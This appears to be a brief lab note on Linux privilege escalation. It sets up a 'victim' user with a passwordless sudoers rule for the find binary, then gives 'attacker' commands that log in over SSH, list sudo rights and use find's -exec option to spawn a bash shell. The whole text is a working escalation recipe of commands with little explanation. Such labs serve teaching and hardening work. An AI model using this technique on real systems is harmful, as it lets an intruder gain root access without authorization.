# Using find command
Victim
```
#useradd -m -s /bin/bash student
#passwd student
#apt install openssh-server -y
#systemctl enable --now ssh
#echo "student ALL=(ALL) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/student
```

Attacker
```
ssh student@victim's_IP
sudo -l
find . -exec /bin/bash \; -quit
```
